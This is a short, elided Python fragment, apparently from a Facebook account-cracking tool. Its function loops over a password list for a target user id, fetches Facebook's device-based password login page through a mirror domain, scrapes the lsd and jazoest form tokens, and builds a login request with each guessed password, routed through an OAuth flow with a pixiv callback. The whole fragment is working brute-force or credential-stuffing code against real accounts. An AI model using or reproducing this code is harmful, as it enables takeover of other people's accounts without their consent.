...
def mobile(uiz,pwr,link_okep):
	...
	for pw in pwr:
		...
		try:
			...
			p = ses.get(f'https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{link_okep}%2Fv14.0%2Fdialog%2Foauth%3Fclient_id%3D140810032656374%26redirect_uri%3Dhttps%253A%252F%252Faccounts.pixiv.net%252Fpigya%252Fproxy%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26state%3DM_y3C7pXiaDN_98BMXhWIavRdrlRrGErQq4G-U17LYQ%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D2d27fbac-d232-41e9-aabc-215d0ed35631%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.pixiv.net%2Fpigya%2Fproxy%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DM_y3C7pXiaDN_98BMXhWIavRdrlRrGErQq4G-U17LYQ%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://"+link_okep+"/v14.0/dialog/oauth?client_id=140810032656374&redirect_uri=https%3A%2F%2Faccounts.pixiv.net%2Fpigya%2Fproxy%2Fcallback%2Ffacebook&response_type=code&scope=email&state=M_y3C7pXiaDN_98BMXhWIavRdrlRrGErQq4G-U17LYQ&ret=login&fbapp_pres=0&logger_id=2d27fbac-d232-41e9-aabc-215d0ed35631&tp=unspecified","flow":"login_no_pin","pass":pw,}
